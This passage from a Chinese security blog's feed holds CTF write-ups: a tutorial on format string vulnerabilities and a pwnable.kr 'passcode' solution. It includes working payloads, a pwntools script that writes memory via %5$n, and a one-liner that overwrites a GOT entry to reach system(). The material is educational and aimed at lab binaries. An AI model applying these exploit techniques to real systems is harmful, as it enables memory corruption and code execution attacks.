SPELL",shellcode)r.interactive() 0x03 其他方法 网上关于这道题目的做法有很多，大部分都是通过第4个输入'Give me an address'来改变v4的值，在这里我就不再多多赘述，这里有几个这样做法的writeup，但是里面有很多问题，希望大家能够批判性的去学习。当然在这里因为我个人水平有限的，我也不敢保证这篇writeup也不存在问题，如果存在问题，还希望大家在评论区指正说明。 攻防世界pwn新手练习（string） string [XCTF-PWN]CTF writeup系列7（超详细分析） 0x04 Reference [1] Mmap的实现原理和应用 [2] 64位汇编参数传递 [3] 格式化串漏洞利用总结⭐ [4] 5.1.2 ShellCode编码的用处 [5] python第一行注释是什么意思？]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解格式化字符串漏洞]]></title>
    <url>%2F2020%2F05%2F29%2F2020.05.29%EF%BC%88119%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 前言 格式化字符串漏洞是在CWE[1]（Common Weakness Enumeration，通用缺陷枚举）例表中的编号为CWE-134，由于在审计过程中很容易发现该漏洞，所以此类漏洞很少出现，但是在很多CTF还存在相关的题目，比如XCTF的pwn新手练习区的 string等，通过这两天的学习，发现还是有必要系统的归纳一下相关知识点，在这里我们以问题为导向展开学习。 0x01 格式化字符串 Q1：什么是格式化字符串 格式化字符串（format string）是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。[2] 上述内容是wiki对格式化字符串的解释，简单来说，格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。[3] 比如： 1printf("Hello %s, Your ID is %d", name, &amp;ID) 对于**格式化函数printf**来说，&quot;Hello %s, Your ID is %d&quot;是printf函数的第一个参数，该参数被称为格式化字符串，name是printf函数的第二个参数，&amp;ID是printf函数的第三个参数，其中%s控制name的输出，%d控制着&amp;ID的输出； 对于**格式化字符串 &quot;Hello &amp;s, Your ID is %d&quot;**来讲，name是它的第一个参数，&amp;ID是它的第二个参数； 例如上图: printf函数第一个参数（格式化字符串）的地址为0xffffd8a0，该地址指向地址0x804a00b，位于栈顶esp； printf函数第二个参数的地址为0xffffd8b8，在栈中处于0xffffd8a4，esp+4； 第三个参数为0x2，通过栈可以看出该数值被存放在地址为0xffffd8a8，栈中为esp+8 通过上面的例子，可以看出，该printf函数的格式化字符串中有两个控制字符%s和%d，说明栈中两个连续的高地址是格式化字符串的第1，2个参数，也是printf函数的第2，3个参数。 Q2：格式化字符串函数的作用是什么？ 格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。[3] Q3：格式化字符串函数的组成是什么？ 格式化字符串有着自己固定的格式，由三部分组成： 格式化字符串函数，比如printf函数 格式化字符串，比如&quot;Hello %s, Your ID is %d&quot; 后续参数（可选），比如name和&amp;ID Q4：格式化字符串的格式是什么？ [2]&amp;[3] 1%[parameter][flags][field width][.precision][length]type parameter：n$，获取格式化字符串中的指定参数；n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO C。例：printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)，产生&quot;17 0x11; 16 0x10&quot; flags：（此项省略） field width：输出的最小宽度； Precision：通常指明输出的最大长度，依赖于特定的格式化类型； Length：指出浮点型参数或整型参数的长度； 字符 描述 hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。 h 对于整数类型，printf期待一个从short提升的int尺寸的整型参数。 l 对于整数类型，printf期待一个long尺寸的整型参数。对于浮点类型，printf期待一个double尺寸的整型参数。对于字符串s类型，printf期待一个wchar_t指针参数。对于字符c类型，printf期待一个wint_t型的参数 ll 对于整数类型，printf期待一个long long尺寸的整型参数。Microsoft也可以使用I64。 L 对于浮点类型，printf期待一个long double尺寸的整型参数。 z 对于整数类型，printf期待一个size_t尺寸的整型参数。 j 对于整数类型，printf期待一个intmax_t尺寸的整型参数。 t 对于整数类型，printf期待一个ptrdiff_t尺寸的整型参数。 type： 字符 描述 d/i 有符号十进制数值int。’%d‘与’%i'对于输出是同义；但对于scanf()输入二者不同，其中%i在输入值有前缀0x或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 u 十进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空 c 如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把wint_t参数转为包含两个元素的wchart_t数组，第一个元素包含要输出的字符，第二个元素为null宽字符 o 8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空 s 如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数 n 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量 p void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值;printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。 x/X 16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空 % '%'字面值，不接受任何 flags, width。 特别说明 这里简单的介绍一下%n控制符，下面会用到： %n 用于将当前字符串的长度打印到var中，例如： 12345678910//gcc str.c -m32 -o str#include &lt;stdio.h&gt;int main(void)&#123; int c = 0; printf("the use of %n", &amp;c); printf("%d\n", c); return 0;&#125; 上述结果为11，也就是the use of的长度。**具体原理：**当printf在输出格式化字符串的时候，会维护一个内部指针，当printf逐步将格式化字符串的字符打印到屏幕，当遇到%的时候，printf会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。这就是问题所在，printf无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正常情况下递增，就会产生越界访问。甚至由于%n的问题，可导致任意地址读写。[5] Q5：常见的格式化字符串函数有哪些？ [3] 名称 基本介绍 类别 scanf 从stdin中向特定地址中读值 输入 printf 输出到 stdout 输出 fprintf 输出到指定 FILE 流 输出 vprintf 根据参数列表格式化输出到 stdout 输出 vfprintf 根据参数列表格式化输出到指定 FILE 流 输出 sprintf 输出到字符串 输出 snprintf 输出指定字节数到字符串 输出 vsprintf 根据参数列表格式化输出到字符串 输出 vsnprintf 根据参数列表格式化输出指定字节到字符串 输出 setproctitle 设置 argv 输出 syslog 输出日志 输出 err, verr, warn, vwarn 等 …… 输出 0x02 格式化字符串漏洞原理 在Q1中我们已经介绍了什么是格式化字符串，并且用例子也进一步说明，那么现在主要介绍一下格式化字符漏洞原理：格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制，所以当prinf函数没有格式化字符串时，我们可以通过输入控制字符来泄露内存信息，用下面的代码为例： 正常应该这样写： 123456789101112131415// code1# include&lt;stdio.h&gt;int main()&#123; int a = 6,b=20; char c[20]; printf("%p\n", &amp;a); scanf("%s",c); printf("%s\n",c); if(a = 8) printf("Success"); else printf("Fail");&#125; 正常结果为 12Hello World!Fail 由于开发者的粗心或者偷懒，将上述代码写成如下所示： 123456789101112131415// code2# include&lt;stdio.h&gt;int main()&#123; int a = 6,b=20; char c[20]; printf("%p\n", &amp;a); scanf("%s",c); printf(c); if(a == 8) printf("Success"); else printf("Fail");&#125; 有一位大佬执行该程序后，输出的结果却是： 1\xd8\x16\xfa\xffaaaaSuccess 我们就以这个简单的例子入手，来梳理和讲解格式化字符串漏洞原理。 Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？ 这里主要看stack中的情况，其中左边的是printf(&quot;%s&quot;,c);语句，右边是printf(c);语句，从code中可以看出 printf 函数的arg[0]（格式化字符串）的地址并不一样，但是从 stack 中可以看到 esp 的地址，也就是两种情况格式化字符串在栈中的存储地址都是0xffffd8a0，由此可以看出 printf(&quot;%s&quot;,c);的格式化字符串为%s printf(c);的格式化字符串为我们输入的AAAA%x.%x.%x.%x.%x.%x.%x，在这里我们可以把printf(c);当作printf(&quot;AAAA%x.%x.%x.%x.%x.%x.%x&quot;);后续参数被省略掉，也就是说格式化字符串要打印的参数有7个，所以从格式化字符串的地址依次+4，则打印的参数地址为esp+0x4、esp+0x8、esp+0xc、esp+0x10、esp+0x14、esp+0x18、esp+1c，那么对于上图中的例子，输出的结果为： 123输入：AAAA%x.%x.%x.%x.%x.%x.%x输出：AAAAffffd8b4.0.8049189.f7fb33fc.41414141.252e7825.78252e78Fail 上述结果分别对应： 栈顶偏移 格式化字符串参数 函数参数 栈中地址 输出结果 esp 格式化字符串 1 0xffffd8a0 --&gt; 0xffffd8b4 AAAA esp+0x4 1 2 0xffffd8a4 --&gt; 0xffffd8b4 ffffd8b esp+0x8 2 3 0xffffd8a8 --&gt; 0x0 0 esp+0xc 3 4 0xffffd8ac --&gt; 0x8049189 8049189 esp+0x10 4 5 0xffffd8b0 --&gt; 0xf7fb33fc f7fb33fc esp+0x14 5 6 0xffffd8b4 (“AAAA”) 41414141 esp+0x18 6 7 0xffffd8b8 (&quot;%x.%&quot;) 252e7825 esp+0x1c 7 8 0xffffd8bc (“x.%x”) 78252e78 Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x? 在了解为什么要输入这个字符串之前，我们先来看看在运行程序时，局部变量存储的位置，这里就要清楚运行时栈的情况，如下图： 从上图可以看出，局部变量被存储在栈中（这里要说明的是全局变量被存储在.data段中），这里还是用code2的代码作为例子，看看main函数中变量 a、b 和 c 存放的位置，通过gdb进行调试，首先来确定变量 a 和 b 的位置，如下图： 下面我们再来寻找 c 的位置，如下图： 从上图中得信息可以得出局部变量 a、b 和 c 在栈中的情况，如下图： printf(&quot;%s&quot;,c); + 输入：AAAAAAAAAAAAAAAAAAAA 下面我们先来看看如果遇到正常的输出printf(&quot;%s&quot;,c);，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图： 输出结果为AAAAAAAAAAAAAAAAAAAA。从上图和结果可以看到esp处的是格式化字符串，里面只有一个控制字符%s，所以格式化字符串只有一参数，位于esp+0x4 处，那么输出的结果就是esp+4指向地址所对应的值AAAAAAAAAAAAAAAAAAAA。 注：这里有一点需要注意，任意的内存的读取需要用到格式化字符串 %s，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。[4] printf(c); + 输入：AAAAAAAAAAAAAAAAAAAA 下面我们先来看看如果遇到printf(c);，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图： 输出结果为AAAAAAAAAAAAAAAAAAAA，虽然这里也是输出20个重复的A，但是和上面的情况完全不一样，这里是因为格式化字符串中没有控制符，所以只将格式化字符串输出，这里一定要分清。 那再想一想，因为格式化字符串是我们的输入，如果我们在输入中加入控制符，比如%x、%p、%n等，那么我们是不是就可以泄露栈上的信息呢？不懂的话下面来一个例子，也就回到了我们这个小问题上为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x？首先来简单的分析一下： 因为我们输入的是 c 的值，c 是局部变量，所以输入的内容被分配在栈上 因为printf(c);函数中没有格式化字符串，只有一个参数 s，所以printf把s地址中的内容当作第一个参数，也就是printf函数的格式化字符串 因为我们的输入含有7个控制符%x，所以相当于printf函数的有7个格式化字符串参数（注意是格式化字符串参数，不是函数参数），所以我们可以将后面7个连续地址都打印出来 因为我们能控制的只有 c 的输入，所以我们可以通过AAAA%x.%x.%x.%x.%x.%x.%x来查找 c 的起始地址（也可以说成参数偏移），从而可以进一步利用我们的输入来改相应的值 Q3：利用格式化字符串漏洞能做什么?[3] 通过对格式化字符串漏洞的利用，可以实现如下功能： 程序崩溃 泄露内存 泄露栈内存 获取栈变量数值 获取栈变量对应字符串 泄露任意地址内存 覆盖内存 覆盖栈内存 覆盖栈内存 覆盖栈内存 进行覆盖 覆盖任意地址内存 覆盖小数字 覆盖大数字 0x03 例题探析 这里还是以code2中的代码为例： 12345678910111213141516// code2# include&lt;stdio.h&gt;int main()&#123; int a = 6,b=20; char c[20]; printf("%p\n", &amp;a); scanf("%s",c); printf(c); // 存在格式化字符串漏洞 if(a == 8) printf("Success\n"); else printf("Fail\n"); printf("%d",a);&#125; ① 编译 为了简单的进行格式化字符串漏洞，在编译时将保护关闭掉： 1gcc -m32 -fno-stack-protector -no-pie -o format_string format_string.c ② 确定数组 c 在栈中相对于格式化字符参数序列 为了确定数组 c 是格式化字符串的参数个数，这里需要通过我们的输入进行泄露，运行程序，并且输入：AAAA%x.%x.%x.%x.%x.%x.%x，查看运行结果： 1AAAAff920694.0.8049189.f7f0c3fc.41414141.252e7825.78252e78Fail 因为“AAAA“的十六进制为”41414141“，所以我们可以判断数组 c 是格式化字符串的第 5 个参数，是printf函数的第 6 个参数，如图： 根据上图，我们简单的来画一下此时栈中的示意图： ③ 改变变量 a 的值 由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。[3]在这里我们想一想怎么才能改变 c 的值呢？让我们一步一步的深入研究： 我们已经知道了栈中的情况，以及变量 c 相对于格式化字符串的参数序列（第5个参数），而且我们能控制的输入只有 c，所以我们要想办法要通过对 c 的输入，向 a 地址写入我们想要输入的值 2) 如何实现这一目标呢？这里需要用到一个控制字符 %n 和 %length$x %n：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量； %n$x：可以直接获取栈中被视为printf函数第 n+1 个参数的值 我们已经确定了数组 c 的地址位置相当于格式化字符串的第 5 个参数，所以我们要在数组 c 的首地址写入 a 的地址，然后使用%5$n 向该地址写入 8，由于 a 的地址长度为 4，所以我们只需要在 %5$n 前面填充 4 个字符，这样输出的字符串长度为 8，那么 %5$n 就会将 8 赋值给格式化字符串的第 5 个参数所指向的地址，也可以将此构造（不唯一）格式进行统一： 1[address][padding][%len$n] 根据上述分析，我们可以构造如下payload：a_addr + &quot;aaaa&quot; + &quot;%5$n&quot;，则完整的 exp 如下： 12345678from pwn import *sh = process("./printf_test2")a_addr = int(sh.recvuntil("\n",drop=True),16)payload = str(p32(a_addr),encoding="unicode_escape") + "aaaa" + "%5$n"sh.sendline(payload)print("[+] result is:",sh.recvuntil("\n"))print("[+] a_value is:",str(sh.recv(),encoding="unicode_escape"))sh.interactive() 输出结果如下： 12345678root@kali:~/Documents/CTF/PWN/Test# python3 printf_test2_exp.py [+] Starting local process &apos;./printf_test2&apos;: pid 2187[+] result is: b&apos;\xa8\xaa\x9f\xffaaaaSuccess\n&apos;[+] a_value is: 8[*] Switching to interactive mode[*] Process &apos;./printf_test2&apos; stopped with exit code 0 (pid 2187)[*] Got EOF while reading in interactive$ 从上述结果中的“success”，以及 a 的值中可以分析出，我们已经成功的将 a 的值改为了 8，这个时候栈中的情况如下示意图： 这里要注意： 我们不能直接在命令行输入 \xa8\xaa\x9f\xffaaaa%5$n 这是因为虽然前面的确实是 a 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 \、x、a、8，所以要用pwntool工具。 0x04 References [1] CWE和CVE及其关系 [2] 格式化字符串 [3] 格式化字符串漏洞原理介绍 [4] 格式化字符串漏洞原理详解 [5] 详谈Format String（格式化字符串）漏洞]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习计划表]]></title>
    <url>%2F2020%2F05%2F25%2F2020.05.24%EF%BC%88118%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Hey, password is required here. 2b87fa2017d9177f8b48cf1371aea156805db5e875437516448c9c27b873e6505223a34f345b6b8fe3baa1824c6238aa3265b04d7668ede665abcf0cd78079d3e04f0a96a0d396dbe9c97ca20dddb1bfef31d6fccb42bf7f06fc0065a2339c2f173937ee11085822750a8bb0965e1dbe717a2863131dad6671b7672878f3fc48eeea8973592f0ff3463699c51b0d7444554900720c8feaede560b61fa0dfc40e871d4be3e4406cc51e6bc5041cc7105006de9f98df0774fb786b29f37dfe34f80493dccd277c59910ea36d04ec6e24caae98854748f3056437a223062f4fd0f82fc5412b429ec55cdd40b331166f343cc1d9b0e0f266546b53744f7c4933acbfefe1448addb966749b06df4cae7f88a93e448b0093986428026ade0fe271638220add522c45f425fe33b485348867dfef4e0beb7150fc0fb9dc08e4b967cb3f7688fee64bdcba9306ae63fd5d6f655af59ad25e6d899631dbd98f5e520dd112c6b19bbaa1155d3f646e4f7d3ddfa6dcab2f52e2eae92fcdcaafd9a21bf66910a21274e8cdcfce902f0ebfd584ac02d8784a6c5ce666e5ceb6ed1bf1cc3986703805f30b6c46c50efa336629eda93cb84c3b3a0529ea1466169f6cb092e58466ba6dba2febdc10863c67bfd733d1c80ab72b317256aa74477fdff9d725bb3691e46683028a2f861d323d321c0cd2569d1f522934fd6ae3bde24f5bed095d82f97b1bc722a562d9d009438161de78a56b49ca7baa6921cbcb7c0d303f08b4cc45ee5a03f512cb9bd892ab972c251969fb2ab84ce9cae2a4f3bcfe1a86c6f2c73f1a8a1cce0edb7f289282924f89bf9e200d2f35bcdaa6c3cd3a10f72dcbde89594fd4c4609c73eb8fa9dd137d03e73448d425d42f205fb3957169dcd9d164b64e99e5b9a56269c36f1f115daffbbcb13b0a53a34b4a96e43ab634df4a2768bbc2e3643f020d0114e0e581f836e3d520045f8b1bbe75d147724324a291fd3f9eb092df31452e9cd9ea1eae6f0cb9d2bc9865e7201414122a6c1dcd6dca77f073752994c3daa1ae0ec5064725228c12eb99ce3c4582692c36e152c3f248bef4fb72abfa38347c52e9521f28baaab4fa246e6e5e98c6db9a44c998b3226086aef0d6c426a0c35bfca11a8712a8f0c93732d1198304aea4f803244e9dc58b6b7f74c40f80c8ef38fe896850922edc9ca02ffc2ec4473b73bf44e476b6b51c55c79b7ccfc62af3c088f71061c09f79c294f1a844ebaf64a95128408a6ddde9568154da0c3d9250114d3f232f646b0512643b6595bc91ed363a7c8af541df6c3c2a858db1042c56ec8892b7caa7309d58351189b4322adfa5e26b040bc040481cf51eb9b0cb16a496f7a9b0499e89b32adb933fbb5fa378c44d679e70c4fdd30a699755bf872f1a55f9a212a4082e9f7a0c841d1c454e5ba85db05a13280f32a508e57d8aa2808c816af737ba7d4e8c6c85cc089eef8ab017112e3ec349496a95f198679252ea173694119ecb33b8b4c09b4c63dd85984eba007765e02510c723db4349123c549ad8c98f6a21ba610f069517150e7ee884e21e8594af7528e5b34108f8a25c3c89abe629a97cd5cbd84761c25284c1de05e26fab320e3df70abab676847716b01beb6db439203d4a59d3c52a9e51a3fb365563caec8e2973af5dcf8f4c537207c59b828da12f5d7ca358836897e5ce3fcd257ca581d7cadfac11693e30dedd06734d816dc759fb8b781c1b4b944266b6005ed1638615ba8d6ea80d6b8c43e7bef2e20636446dbcaa66b81cc32b1bc7dd161319e700b2ea9dbfc8113796cb202788ed47931012a4638a9d0f2a9288d8b55ae096d4a93d199611b406a6e8f7b36ad00f6d71ef257b3404c01c92a0f9179d4f198e53594232470f4b440f7e21c778d88a99ad1f4ff6bf122957d3d5fa448d4366b6869f3b757c0e78745b9d8692457942a65c45a8ebbe78f091407c5696e1199190d8ec409ab7287d42699860e3a3b9b3fae905e68528a06b93ffe958430838949c04fd063ddc2f6fbb1a9b507f5e2ba32b21a300266e3a5f126c324cf6a882b06bc0333ecc538f0c835cdd53479013e51542d0729a926f076f9f91fbd2638663073ab8dee042f67bf3626a079db359ac2a86e4da523f9e1c5943b79d5426613b977d85b94ea689d8e93bdb85d46774a8832b63e92093a191e123024f44796db1a706a21a2c5593a221b770e2a53ed09874dc39fca074bcd60722f523fc88c32c4ad18c90cf92f27df23109b6699c129797fc9b784eac6eafba9e509b722615916f53c09bd11c052da2e5c6fad2241f3cf197f1b22fe0ddaa7a1b6260d4b734a5406c98d0b371ede3fe43c925261cea19330434e7214843c4065327edec69fbc8fe494d43bf4b743f7266ef984a13fe980138abd29874e2564c0f1e7c7ccb0959502fdf6f6c1bd157dfce38488be1d421785027c88c3873d40b8d99fa23f691a43c32da0aed371eed42caab9416493268ae70842e843142cc17ac905bd4cd08fac6a20e774dba46c55e220de1ab3c8c9913827e2c97e07fd4906d526f565cb727aac24f1c10968f498f4f4a8b6f18b186e4369901454858b191632b83c21fe09ac4f2ccdeb021acdc6fa40a6ab1f8fc6a13ca244ca717ad96bcfc7236fbecbbcaa18a38b30cc16b3070f31adbed7dfc648684c085b142d34b0ea0afd25d0314457da1c266fd0248dad1286114b7a514a92d4468c788866449b9506633c9c0f580848721ce64bdbd0250716a2ed72482ef2f522be3474402a31f333dc532fd23f89b93100b5902456ca602955ccfd9c08d86cb85e9d3b0de92a0e88f66ddf889defe303222c6824f6ee2df852195d4817735b60970f2b96db8ee917fbd929c3f402391a2a6c6a2282ad9486dc3f82c76fb921c21a19e6a2d3ed3d009db187b5fa9dbe3554053be86b060b8bf0a6427cce2fed6df6266e97a244196f8dfbee301db44df1ec8f13816b78f2ee6651ad430005a163d4f6945cd7c24c8d710d3789c42dccec2f120f5ea6537e555d9a26828e0e56411e01bb2f3d8f50e0a8f0f01c255d16bdf35dbcfe65aaf8e403c26b4a13617933544f96be8db13a22ad92f67d1bd11aedb80ca3d1385d41d5f5d83ab9523391e70fcfcaa4bd53570dd7986f8bfbaa0ceedfb3d113b8c9cc01799cdae88066e0b007b5d8a47e379bb63e0ca78a360d248ae029f1014544eaa5c28bdfe3a3f36e286bb00b433f6165aa13f83baa4edae1bb0f06b88fcc9bc3c6efd48b9c70e299cf84e931721512081ccc74ced10bfdb7cea4a8557a9efd9ebd23b1123c98a7225e928f701c58a6417dbe04e9130833f604455ce9516ee62961b8368a17296264712749c77baaa6d79ce295bc3eecc328097603236718e2bd8798ae1ba50a9e896419582d4eebd73dcb52a8ec5bb9b634a875accaa7176a236e3d0df1996a0c689977f6b55c14564fc5e2cb01b70c3e85a13f2ce2b50bd1f6100ffca70ca69f72d9ed3663a8b1ccd19e894b158943ea05964f4dc257423c696afffee18df62c6c4eb00634e1e09995429b0850ef94312443cf3737202b08a0c72a]]></content>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr的奇幻之旅（五）[passcode]]]></title>
    <url>%2F2020%2F05%2F15%2F2020.05.05%EF%BC%88117%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基础知识1.mov eax,gs:0x14指令的作用 gcc编译器专门为防止缓冲区溢出而采取的保护措施，具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。 简单来说就是，从gs:0x14的地方取出来，然后在函数返回之前对比栈中的这个随机值和gs:0x14来断定是否发生栈溢出。 2.lea和mov指令的区别◫ lea：将源操作数的地址传到目的操作数中 ◫ mov：将数据从源操作数传到目的操作数中 例如：The address of ebx is 0xffe1c1e8 and data is 0xf7fadd20 in 0xffe1c178(0xffe1c1e8-0x70). ⇱ lea edx,[ebx-0x70]：是将ebx-0x70的地址 0xffe1c178传到edx寄存器中 ⇱ mov edx,[ebx-0x70]：是将ebx-0x70地址中的数据0xf7fadd20传到edx寄存器中 3.scanf的原理需要注意的是： 用户输入的字符，会以ASCII码形式存储在键盘缓冲区； 每调用一次scanf函数，就从键盘缓冲区读走一个字符，相当于清除缓冲区； 若用户一次输入n个字符，则前n次调用scanf函数都不需要用户再次输入，直到把缓冲区的数据全部读取(清除)干净； scanf取地址&amp;符号的作用：是将从键盘缓冲区读取的字符放到&amp;var地址中，其中字符串无需&amp;，因为字符串本身就代表地址的开始； 调用scanf()函数时，用户最后输入的回车也会储存在键盘缓冲区；(见如下程序) 1234567891011121314151617181920# include &lt;stdio.h&gt;int main()&#123; char c; scanf("%c", &amp;c); printf("%d\n", c); scanf("%c", &amp;c); printf("%d\n", c); return 0;&#125;/*程序在VC++6.0中的显示结果是：14910*/ 下面以一个例子做个简单介绍： 12345678910111213141516171819202122232425262728293031323334353637383940414243# include &lt;stdio.h&gt;int main()&#123; char ch; while (1) &#123; scanf("%c", &amp;ch); switch(ch) &#123; case '1': printf("case1\n"); break; case '2': printf("case2\n"); // fflush(stdin); //清除缓冲区 break; case '3': printf("case3\n"); break; case 'e': return 0; default: return 0; &#125; &#125; return 0;&#125;/*输入：1235输出：case1case2case3输入：1输出：case1*/ 对于第二个输入1，为什么不会继续循环呢？ 因为当输入“1”后，相当于输入了“1”和“回车”，键盘缓冲区将保存它们的ASCII码：49 10，但是因为scanf(“%c”,&amp;a);语句将把ASCII码49送入a中，所以第一次执行完scanf(“%c”,&amp;a);语句后，键盘缓冲区中剩下的内容为：10，然后进入switch语句，因为现在a=’1’，所以执行case ‘1’分支，break后继续while循环，开始第二次执行scanf(“%c”,&amp;a);语句，但这次程序不会停下来等待输入，因为键盘缓冲区中还有剩余的ASCII码：10。因此第二次执行scanf(“%c”,&amp;a);语句时，程序直接将缓冲区中的ASCII码10送入a中，接着又进入switch语句，但是现在a=’CR’，所以转到default分支，执行return后退出循环和函数。 二、题目分析1.首先连上服务器看一下passcode.c文件： 从图中可以看出，main函数中先后调用了两个函数，即welcome和login函数： 在welcome函数中，需要输入长度为100的name字符串； 在login函数中需要输入两个变量的值passcode1和passcode2，并且在输入passcode1后清除了stdin中的缓存，也就是防止在输入passcode1的时候，将值给passcode1。更为重要的一点是该函数中的两个scanf输入整数类型时，没有加&amp;符号，也就意味着将passcode1和passcode2中的值当作地址，然后将键盘中的缓存输入这两个地址指向的内存中，示意图如下： 如果带有&amp;符号，正常的情况下如下图： 2.file passcode查看一下ELF文件的格式： 12passcode@pwnable:~$ file passcodepasscode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped 可得可执行文件passcode是一个32位的ELF可执行文件 3.checksec passcode查看一下该可执行文件开启了什么保护： 1234567passcode@pwnable:~$ checksec passcode[*] &apos;/home/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELROd Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 可得： 对GOT表具有写的权限 开启了Cookie，也就是金丝雀保护 栈不可知性 没有内存开启地址随机化 4.如何才能执行system函数？ 第一种方法就是使得passcode1==338150 &amp;&amp; passcode2==13371337，但是我们无法往passcode1和passcode2中再写入值，而是只能向这两个变量中的值所指向的内存地址写入值，那么这种方法❌ 第二种方法就是通过变量name的输入实现栈溢出，但是passcode开启了金丝雀，所以无法实现栈溢出❌ 第三种方法就是利用ret2libc技术✔ 三、解题步骤1.scp -P 2222 passcode@pwnable:home/passcode/passcode /tmp将passcode从远程服务器上下载到本地，然后用gdb进行调试，寻找name、passcode1和passcode2的位置： 从上图可以看出name的起始地址为ebp-0x70，在本次调试中为0xffd3bdc8 从上图可以看出passcode1的起始地址为ebp-0x10，在本次调试中为0xffd3be28，而0xffd3be28中的值指向了0xffd3be84，0xffd3be84中的值为0 从上图可以看出passcode2的起始地址为ebp-0xc，在本次调试中为0xffd3be2c，而0xffd3be2c中的值指向了0x3b8fa100 虽然都是ebp-.但是对于welcome和login函数中的ebp是否一样呢？我们看上面的三张图片： 第一张是welcome函数的，其中ebp的地址为EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0 第二张是login函数的，其中ebp的地址为EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0 所以可以得到如下的示意图： 2.通过题目中的passcode.c源码以及gdb的调试结果可以得到，passcode1的位置处于name内存的最后四个字节，可以通过上面的示意图得出该结论，因此我们可以在输入name变量值的时候，将passcode1中的值进行修改，可以使得我们往特定的地址输入值，那么我们可以利用该思想进行绕过。我们看一下 system(“/bin/cat flag”);语句前面是printf(“Login OK!\n”);语句，我们是不是可以绕过if的判断条件，直接执行printf(“Login OK!\n”);语句或者system(“/bin/cat flag”);，在这里我们可以修改fflush函数的GOT表，要注意这里修改的是GOT表，因为RELRO: Partial RELROd说明GOT表具有可写的权力，具体的如下方的示意图： 3.上图只是一个大概的过程，可知我们的构造如下： 1python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514135&apos;+&apos;\n&apos;&quot;| ./passcode 得到如下结果： 12345Toddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!enter passcode1 : Login OK!Sorry mom.. I got confused about scanf usage :(Now I can safely trust you that you have credential :) 这里要注意的是： 在修改0x804a004时要用小段进行书写，因为Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00魔数的第6个字是01代表小段。 在输入0x80485d7时，因为要求是整数，所以要将0x80485d7变为134514135 四、参考文章 栈溢出攻击及防护方法简介 手把手教你栈溢出从入门到放弃（上） Linux 栈溢出保护机制 键盘缓冲区（scanf原理） C语言scanf函数原理 scanf()函数原理 [原创]pwnable.kr passcode]]></content>
      <categories>
        <category>Binary</category>
      </categories>
